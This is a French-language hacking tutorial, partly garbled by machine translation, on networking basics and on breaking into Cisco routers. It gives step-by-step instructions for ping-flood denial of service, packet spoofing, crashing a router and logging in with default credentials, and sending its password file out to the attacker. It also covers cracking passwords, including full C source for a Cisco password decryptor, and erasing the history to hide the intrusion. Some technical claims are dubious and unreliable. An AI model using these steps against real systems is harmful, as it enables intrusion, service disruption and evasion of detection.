Qu'est-ce qu'une adresse IP ?

IP signifie Protocole Internet, des adresses IP sont employées par d'autres ordinateurs pour identifier les autres. C'est comment-ça que vous pouvez être interdits d'IRC et comment ils peuvent trouver votre FOURNISSEUR D'ACCÈS INTERNET. Des adresses IP sont facilement obtenues, ils peuvent être trouvées par les méthodes suivantes :

-vous allez à un site Web, votre IP est enregistrée

-sur IRC, chacun peut obtenir votre IP

-sur ICQ, les gens peuvent obtenir votre IP, même si vous avez le jeu d'option "ne montrent pas ip" ils peuvent toujours l'obtenir

-si vous êtes connecté à quelqu'un, il peut taper "systat" et voir qui est connecté

-si quelqu'un vous envoie un email avec IP-logging java, ils peuvent aussi obtenir votre adresse IP

Il y a beaucoup plus de solutions pour obtenir des adresses IP, incluant l'utilisation de programmes déguisés comme Sub7 ou NetBus.

Qu'est-ce qu'un FOURNISSEUR D'ACCÈS INTERNET ?

ISP signifie Fournisseur d'accès à Internet. Vous  vous connectez à un ISP chaque fois vous avez composé un numéro et réalisé un connexion. Les gens peuvent obtenir votre FOURNISSEUR D'ACCÈS INTERNET simplement en dirigeant un traceroute sur vous (traceroute est expliqué plus tard). Il verra quelque chose dans le genre de cela :

Quel est un paquet de TCP/IP ?

TCP/IP signifie Protocole de Contrôle de Transmission et le Protocole d'Internet, un paquet TCP/IP est un bloc de données comprimées, puis ensuite une en-tête est rajoutée et il est envoyé à un autre ordinateur. C'est comme cela que TOUS les transferts d'Internet se passent, en envoyant des paquets. L'en-tête dans un paquet contient l'adresse IP de celui qui est à l'origine du paquet. Vous pouvez récrire un paquet et faire croire qu'il provient de quiconque!! Vous pouvez employer cela pour gagner accès à un tas de systèmes, et vous ne serez pas attrapé. Vous devrez faire tourner Linux ou avoir un programme qui vous laissera faire cela. Ce guide ne vous dit pas d'employer cela sur un routeur Cisco, mais c'est pratique pour hacker n'importe quel système. Si quelque chose tourne mal quand vous essayez de hacker un système, vous pouvez toujours essayer cela...

Comment masquer votre IP :

Trouvez un programme comme le Génie 2 ou DC EST, qui vous laissera faire tourner IdentD. Cela vous laissera changer la partie identité de votre ordinateur à volonté! Employez cela quand vous êtes interdits d'IRC.... Vous pouvez revenir directement dedans! Vous pouvez aussi l'employer quand vous avez accès à un autre système, donc il enregistre une fausse id...

Comment employer telnet :

Vous pouvez ouvrir telnet simplement par à votre Menu Démarrer, ensuite Executer et taper "telnet".

Une fois que vous avez ouvert telnet, vous pouvez vouloir changer quelques particularités. Clic sur Terminal > Préférences. Ici vous pouvez changer la taille du tampon, la fonte et d'autres choses. Vous pouvez aussi allumer /éteindre "l'écho local", si vous allumez l'écho local sur votre ordinateur, il vous montrera tout ce que vous tapez et l'autre ordinateur auquel vous êtes joint vous le montrera également.
Donc vous pouvez obtenir quelque chose dans le genre de cela;

Vous tapez "Hello" et vous obtenez
Hhelelollo

C'est parce que l'information a revenue et a été mélangée avec ce que vous avez tapé. La seule raison de l'employer c'est si la machine n'affiche pas ce que vous tapez.

Par défaut, telnet se connectera à un système sur le port telnet, qui est le port 23. Vous ne voudrez pas toujours vous connecter au port 23, ainsi quand vous allez vous connecter, vous pouvez changer le port à peut-être 25, qui est le port pour le serveur de courrier, ou peut-être le port 21, pour FTP. Il y a des milliers de ports, assurez-vous donc que vous  choisissez le juste!

Comment employer Hyperterminal :

L'hyperterminal vous permet d'ouvrir "un serveur" sur n'importe quel port de votre ordinateur pour écouter l'information entrante des ordinateurs indiqués. Pour employer cela, allez à  Start>Programs>Accessories>Communications>HyperTerminal. D'abord vous devrez choisir la connexion, là choisissez "le TCP/IP Winsock" et indiquez ensuite l'ordinateur avec lequel communiquer et le numéro de port. Vous pouvez cela dire d'attendre une connexion par  Appeler > Attend l'Appel. Maintenant l'autre ordinateur peut vous connecter sur ce port et vous pouvez bavarder et transférer des fichiers.

Comment employer Ping :

Ping est facile, ouvrir juste MS-DOS et taper "Ping ip.address", par défaut il fera Ping 3 fois, mais vous pouvez taper

"Ping ip.address-t"

Qui fera Ping pour toujours. Changer la taille de Ping:

" Ping -l (taille) ip.address"

Ping envoie un paquet de données à un ordinateur, voit ensuite combien de temps il met à répondre, et détermine la vitesse de connexion de l'ordinateur et le temps qu' un paquet prend pour est appelé le
"trip time". Ping peut aussi être employé pour ralentir ou même effondrer un système si le système est surchargé par des inondations de Ping.
Windows 98 crashe après une minute de pingflooding (c'est le tampon de connexions qui déborde - trop de connexions sont enregistrées et donc Windows décide de prendre une petites vacances).
Une attaque d'inondation de Ping prend beaucoup de votre largeur de bande et vous devez avoir plus de largeur de bande que votre cible (à moins que la cible ne soit une boîte de Windows 98 et vous avez un modem moyen, cette voie que vous le crasherez après approximativement un minute de simple d'inondation de Ping). L'inondation de Ping n'est pas efficace contre des cibles plus fortes, à moins que vous n'ayez à vous quelques connexions supplémentaires et que vous avez le contrôle de quelques hôtes avec une grande de largeur de bande qui peuvent Pinger votre cible pour vous.

Notez : l'option-t du DOS ne fait pas d'inondation Ping, cela Ping la cible continuellement, avec des intervalles d'un Ping à un autre. Avec UNIX ou Linux, vous pouvez employer le Ping -f pour faire du pingflood réel. En réalité le Ping -f est exigé si vous voulez que votre distribution soit POSIX-DOCILES (POSIX - l'Interface de Système de Fonctionnement d'Ordinateur portatif basée sur UNIX), autrement ce n'est pas une distribution réelle Unix/Linux, donc si vous avez un OS qui s'appelle UNIX ou bien Linux, il a le commutateur -f.

Comment employer TraceRoute :

TraceRoute trace votre connexion (et voir tout ordinateur entre vous et cible), ouvrir juste MS-DOS et le taper "tracert ip.address" et vous verrez une liste d'ordinateurs, qui sont entre vous et l'ordinateur cible.

Vous pouvez employer cela pour déterminer s'il y a des firewalls bloquant quelque chose. Ils vous permettront aussi de déterminer le FOURNISSEUR D'ACCÈS INTERNET de quelqu'un (le fournisseur d'accès à Internet).

Pour déterminer le FOURNISSEUR D'ACCÈS INTERNET, regarder simplement à l'avant dernière adresse IP, cela doit être un des routeurs du fournisseur d'accès Internet.

Essentiellement, traceroute fonctiuonne comme cela - un paquet TCP/IP  a une valeur dans son en-tête (Si vous ne savez pas ce que cela signifie, ignorez-le donc et continuez à lire, ce n'est pas que crucial) appelée TTL, qui signifie Temps Pour Vivre. Chaque fois qu'un paquet voyage par un routeur, la valeur de TTL est diminué par un. C'est juste une contre-mesure contre la possibilité que quelque chose tourne mal et un paquet ricocherait toujours dans le web, gaspillant ainsi de la largeur de bande.
Ainsi le TTL d'un paquet atteint zéro, il meurt et une erreur ICMP est envoyée à l'expéditeur.
Maintenant, traceroute envoie d'abord un paquet avec une valeur de TTL de 1. Le paquet revient rapidement, et par donne l'adresse de l'expéditeur dans l'en-tête de l'erreur ICMP, traceroute sait où le paquet a été renvoyé; cela est la première étape. Alors il envoie un paquet avec une valeur de TTL de 2 et il revient après la deuxième étape, révélant l'identité du deuxième routeur. Cela continue tant que le paquet n'atteigne sa destination.

C'est amusant non ? :-)

Comment employer un serveur proxy :

Faites une recherche sur le web pour un serveur proxy qui tourne sur le port de votre choix. Une fois que vous trouvez un, connectez-vous y ou bien avec telnet ou bien l'hyperterminal et connectez-vous ensuite à un autre ordinateur par le serveur proxy. De cette façon, l'ordinateur à l'autre bout ne saura pas votre adresse IP.

Section 1 : pourquoi hacker un routeur cisco ?

Vous vous demandez probablement .. Pourquoi hacker un routeur cisco ?

La raison est qu'ils sont utiles quand il s'agit de pénétrer dans d'autres systèmes...

Les routeurs Cisco sont très rapides, certains avec 18 connexions T1 sur un système et ils sont très flexibles et peuvent être employés dans des attaques de DoS ou pour hacker d'autres systèmes puisque la plupart d'entre eux ont telnet.

Ils voient aussi passer des milliers de paquets, qui peuvent être capturés et décodés... Beaucoup de routeurs cisco sont des serveurs de confiance et des systèmes vous laisseront avoir un certain accès aux autres ordinateurs de leur réseau.

Section 2 : découverte d'un routeur cisco

La découverte d'un routeur cisco est une tâche assez facile, presque chaque FOURNISSEUR D'ACCÈS INTERNET utilise au moins un routeur cisco. La façon la plus facile de trouver un routeur cisco est de lancer un traceroute sous DOS (taper "tracert" et ensuite l'adresse IP de l'ordinateur), vous pouvez tracer à peu près quiconque parce que la trace montrera tous les systèmes  entre votre ordinateur et leur ordinateur. Un de ces systèmes aura probablement "cisco" dans son nom. Si vous en trouvez un comme cela, copiez son adresse IP.

Maintenant vous avez l'emplacement d'un routeur cisco, mais il peut avoir un firewall le protégeant, donc vous pouvez voir s'il est bloqué en pingant quelques fois: si vous recevez une réponse, il pourrait ne pas être bloqué. Un autre solution est d'essayer d'avoir accès à certains des ports du routeur cisco, vous pouvez faire cela simplement en employant telnet et ouvrant une connexion au routeur sur le port 23.. S'il ne demande qu'un mot de passe, mais aucun username, vous êtes au routeur, mais s'il veut un username, vous êtes probablement sur un firewall.

Essayez de trouver un routeur sans firewall, comme ce guide est sur les routeurs et pas comment contourner les firewalls. Une fois que vous êtes sûrs que vous avez trouvé un bon système, vous devez trouver un serveur proxy qui vous permet d'employer le port 23, pour que votre IP ne soit pas enregistrée par le routeur.

Section 3 : comment pénétrer dans un routeur cisco

Cisco des routeurs qui font tourner le logiciel v4.1 (c'est actuellement la plupart d'entre eux) seront facilement mis hors de service. Vous vous connectez simplement au routeur sur le port 23 par votre serveur proxy et entrez à un mot de passe ÉNORME, quelque chose dans le genre de ;

Attendez maintenant, le système cisco pourrait se réamorcer, dans le cas où vous ne pouvez pas le hacker parce que c'est offline.. Mais il se gèlera probablement pour 2-10 minutes, temps pendant lequel vous devez vous employer à le pénétrer.

Si rien de cela n'arrive, il ne possède pas le logiciel vulnérable; dans ce cas vous pouvez essayer plusieurs attaques DoS, comme un Ping énorme. Allez sous DOS et tapez "Ping -l 56550 cisco.router.ip -t", cela aura le même effet pour vous.

Quand il est gelé, ouvrez une autre connexion d'un autre proxy et mettre le mot de passe "admin", parce que c'est le mot de passe par défaut du routeur et quand qu'il est temporairement mis hors de service, il y retournera dans sa configuration par défaut.

Maintenant que vous vous êtes connectés, vous devez mettre la main sur le fichier de mots de passe! Les systèmes ont un logiciel différent, mais la majorité auront un prompt comme "htl-textil" ou quelque chose comme cela, maintenant tapez "?" pour la liste de commandes, vous verrez une liste énorme de commandes, quelque part là dedans vous trouverez une commande de transfert, l'utiliser pour obtenir le fichier de mots de passe d'admin (qui est l'utilisateur actuel) et l'envoyer à votre propre adresse IP sur le port 23. Mais avant que vous faites cela, allumez l'Hyperterminal pour attendre un appel du routeur cisco. Une fois que vous envoyez le fichier, l'Hyperterminal vous demandera si vous voulez accepter le fichier que cette machine vous envoie, dire oui et le sauver sur le disque. Deconnexion.

Vous avez passé la partie la plus dure, vous vous donnez une tape dans le dos et préparez- vous à casser ce mot de passe!

Section 4 : casse du mot de passe

Maintenant que vous avez acquis le fichier de mot de passe, vous devez le casser, ainsi vous pourrez avoir accès au routeur de nouveau. Pour faire cela, vous pouvez utiliser un programme comme John le Ripper, ou un autre soft, sur le fichier de mot de passe et vous pouvez le casser.

C'est la voie la plus facile et la voie que je recommanderais. Une autre solution serait d'essayer et de le décrypter. Pour cela vous aurez besoin d'un logiciel de décryptage, beaucoup une patience et une partie de la séquence de décryptage.

Voici un logiciel pour décrypter un mot de passe cisco, vous devez le compiler dans linux :

#include <stdio.h>
#include <ctype.h>

char xlat[] = {
        0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f,
        0x41, 0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72,
        0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44
};

char pw_str1[] = "password 7 ";
char pw_str2[] = "enable-password 7 ";

char *pname;

cdecrypt(enc_pw, dec_pw)
char *enc_pw;
char *dec_pw;
{
        unsigned int seed, i, val = 0;

        if(strlen(enc_pw) & 1)
                return(-1);

        seed = (enc_pw[0] - '0') * 10 + enc_pw[1] - '0';

        if (seed > 15 || !isdigit(enc_pw[0]) || !isdigit(enc_pw[1]))
                return(-1);

        for (i = 2 ; i <= strlen(enc_pw); i++) {
                if(i !=2 && !(i & 1)) {
                        dec_pw[i / 2 - 2] = val ^ xlat[seed++];
                        val = 0;
                }

                val *= 16;

                if(isdigit(enc_pw[i] = toupper(enc_pw[i]))) {
                        val += enc_pw[i] - '0';
                        continue;
                }

                if(enc_pw[i] >= 'A' && enc_pw[i] <= 'F') {
                        val += enc_pw[i] - 'A' + 10;
                        continue;
                }

                if(strlen(enc_pw) != i)
                        return(-1);
        }

        dec_pw[++i / 2] = 0;

        return(0);
}

usage()
{
        fprintf(stdout, "Usage: %s -p <encrypted password>\n", pname);
        fprintf(stdout, "       %s <router config file> <output file>\n", pname);

        return(0);
}

main(argc,argv)
int argc;
char **argv;

{
        FILE *in = stdin, *out = stdout;
        char line[257];
        char passwd[65];
        unsigned int i, pw_pos;

        pname = argv[0];

        if(argc > 1)
        {
                if(argc > 3) {
                        usage();
                        exit(1);
                }

                if(argv[1][0] == '-')
                {
                        switch(argv[1][1]) {
                                case 'h':
                                usage();
                                break;

                                case 'p':
                                if(cdecrypt(argv[2], passwd)) {
                                        fprintf(stderr, "Error.\n");
                                        exit(1);
                                }
                                fprintf(stdout, "password: %s\n", passwd);
                                break;

                                default:
                                fprintf(stderr, "%s: unknow option.", pname);
                        }

                        return(0);
                }

                if((in = fopen(argv[1], "rt")) == NULL)
                        exit(1);
                if(argc > 2)
                        if((out = fopen(argv[2], "wt")) == NULL)
                                exit(1);
        }

        while(1) {
                for(i = 0; i < 256; i++) {
                        if((line[i] = fgetc(in)) == EOF) {
                                if(i)
                                        break;

                                fclose(in);
                                fclose(out);
                                return(0);
                        }
                        if(line[i] == '\r')
                                i--;

                        if(line[i] == '\n')
                                break;
                }
                pw_pos = 0;
                line[i] = 0;

                if(!strncmp(line, pw_str1, strlen(pw_str1)))
                        pw_pos = strlen(pw_str1);

                if(!strncmp(line, pw_str2, strlen(pw_str2)))
                        pw_pos = strlen(pw_str2);

                if(!pw_pos) {
                        fprintf(stdout, "%s\n", line);
                        continue;
                }

                if(cdecrypt(&line[pw_pos], passwd)) {
                        fprintf(stderr, "Error.\n");
                        exit(1);
                }
                else {
                        if(pw_pos == strlen(pw_str1))
                                fprintf(out, "%s", pw_str1);
                        else
                                fprintf(out, "%s", pw_str2);

                        fprintf(out, "%s\n", passwd);
                }
        }
}

Section 5 : utilisation du routeur

Pour employer ce merveilleux morceau de technologie, vous devrez être capables de vous y connecter, employer un proxy si vous ne voulez pas que votre IP soit enregistrée. Une fois que vous vous êtes connecté, vous voudrez mettre hors de service l'histoirique pour que personne ne puisse voir que vous étiez là: tapez "terminal history size 0". Maintenant il ne se rappellera rien! tapez "?" pour une liste des commandes de tout le routeur et vous serez capables d'employer la plupart d'entre elles.

Ces routeurs ont d'habitude telnet, donc vous pouvez employer telnet pour vous connecter à d'autres systèmes, (comme des boîtes unix) et les hacker. Ils sont aussi équipés de Ping et traceroute, que vous pouvez employer pour tracer des systèmes ou faire des attaques de DoS. Vous pouvez aussi être capables de l'employer pour intercepter des paquets, mais je ne recommande pas cela, car il ne travaillera pas toujours, et peut vous faire remarquer....
